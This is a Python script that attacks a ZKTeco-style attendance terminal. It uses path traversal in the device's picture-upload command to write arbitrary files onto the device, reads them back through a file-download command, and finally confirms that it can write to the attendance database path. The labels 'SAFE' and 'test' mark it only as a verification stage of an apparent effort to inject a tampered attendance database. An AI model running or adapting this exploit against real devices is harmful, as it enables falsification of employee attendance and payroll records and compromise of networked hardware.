#!/usr/bin/env python3
"""SAFE: Roundtrip a small file first to verify the upload path works."""
import sys
sys.path.insert(0, 'D:\\chamcong\\AttendanceSuite_Portable\\python\\Lib\\site-packages')
sys.stdout.reconfigure(encoding='utf-8')

import socket, struct, time, os
from zk import ZK, const
from struct import pack, unpack

DEVICE_IP = '172.16.0.214'
TEST_FILE = '/mnt/mtdblock/data/mavis_safe_test.txt'
OUT_DIR = 'D:\\chamcong\\zk_inject_workspace'

def send_cmd(conn, command, data=b''):
    try:
        return conn._ZK__send_command(command, data, response_size=1024)
    except Exception as e:
        return {'status': False, 'error': str(e)}

def free_data(conn):
    send_cmd(conn, const.CMD_FREE_DATA, b'')

def upload_via_picture(conn, target_path, data):
    parts = target_path.split('/')
    traversal = ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + ".." + chr(47) + "/".join(parts)
    filename = traversal.encode() + b'\x00'
    free_data(conn)
    time.sleep(0.5)
    size = len(data)
    r1 = send_cmd(conn, const.CMD_PREPARE_DATA, pack('I', size))
    if not r1.get('status'):
        return {'error': 'PREPARE failed', 'r1': r1}
    MAX_CHUNK = 1024
    remain = size % MAX_CHUNK
    packets = (size - remain) // MAX_CHUNK
    for i in range(packets):
        r = send_cmd(conn, const.CMD_DATA, data[i*MAX_CHUNK:(i+1)*MAX_CHUNK])
        if not r.get('status'): return {'error': 'chunk {} fail'.format(i)}
    if remain:
        r = send_cmd(conn, const.CMD_DATA, data[packets*MAX_CHUNK:])
    free_data(conn)
    r3 = send_cmd(conn, 0x272B, filename)
    return {'PREPARE': r1, 'UPLOAD': r3}

def download_file(conn, path):
    sock = conn._ZK__sock
    free_data(conn)
    time.sleep(0.5)
    r = send_cmd(conn, 0x6A6, (path + '\x00').encode())
    if not r.get('status') and r.get('code') != 1500:
        return None, r
    sock.settimeout(10)
    total = b''
    chunks = 0
    while True:
        try:
            chunk = sock.recv(65536)
            if not chunk: break
            if len(chunk) >= 16:
                top1, top2, tcp_len = unpack('<HHI', chunk[:8])
                zk_cmd = unpack('<H', chunk[8:10])[0]
                body = chunk[16:16+(tcp_len - 8)] if tcp_len > 8 else b''
                total += body
                chunks += 1
                if zk_cmd == 0x07D0 or zk_cmd == 2000: break
                if chunks > 100 and len(total) > 0: break
        except socket.timeout: break
    return total, chunks

os.makedirs(OUT_DIR, exist_ok=True)

zk = ZK(DEVICE_IP, port=4370, timeout=15, password=0)
conn = zk.connect()
print('[+] Connected:', conn.get_firmware_version(), conn.get_platform())

try:
    before_att = conn.get_attendance_count()
    print('[*] BEFORE ATTLOG count: {}'.format(before_att))
except: before_att = None

try: conn.disable_device()
except: pass

# === Step 1: Upload small test file ===
print('\n=== STEP 1: Upload small test file ===')
test_content = b'HELLO_MAVIS_2026_TEST_' + b'A' * 100  # ~120 bytes
result = upload_via_picture(conn, TEST_FILE.split('mnt/mtdblock/data/')[1], test_content)
print('  Result:', result)

# === Step 2: Download back ===
print('\n=== STEP 2: Download to verify ===')
data, chunks = download_file(conn, TEST_FILE)
print('  Chunks:', chunks, 'Bytes:', len(data))
print('  Content:', data)
if data == test_content:
    print('  [+] EXACT MATCH - upload/download path VERIFIED!')
elif data[:100] == test_content[:100]:
    print('  [~] PARTIAL MATCH')
else:
    print('  [!] MISMATCH')

# === Step 3: Try a larger file ===
print('\n=== STEP 3: Upload larger file (4KB) ===')
test_content2 = b'X' * 4096
result = upload_via_picture(conn, 'mnt/mtdblock/data/mavis_safe_4k.bin', test_content2)
print('  Result:', result)

print('\n=== STEP 4: Download 4KB file ===')
data2, chunks2 = download_file(conn, '/mnt/mtdblock/data/mavis_safe_4k.bin')
print('  Chunks:', chunks2, 'Bytes:', len(data2))
if data2 == test_content2:
    print('  [+] 4KB EXACT MATCH!')
elif data2[:100] == test_content2[:100]:
    print('  [~] 4KB PARTIAL - first 100 bytes match')
else:
    print('  [!] 4KB MISMATCH')
    print('  First 50 sent:', test_content2[:50])
    print('  First 50 got:', data2[:50])

# === Step 5: Try the actual ZKDB.db path but with a small fake ===
print('\n=== STEP 5: Try write to /mnt/mtdblock/data/mavis_zkdb_test.db ===')
fake_zkdb = b'SQLite format 3\x00' + b'\x00' * 100  # tiny fake SQLite
result = upload_via_picture(conn, 'mnt/mtdblock/data/mavis_zkdb_test.db', fake_zkdb)
print('  Result:', result)

print('\n=== STEP 6: Verify fake_zkdb exists ===')
data3, chunks3 = download_file(conn, '/mnt/mtdblock/data/mavis_zkdb_test.db')
print('  Chunks:', chunks3, 'Bytes:', len(data3))
print('  Content:', data3)
if data3 == fake_zkdb:
    print('  [+] ZKDB.db path WRITE CONFIRMED!')

try: conn.enable_device()
except: pass
try: conn.disconnect()
except: pass
print('\n[+] Done')
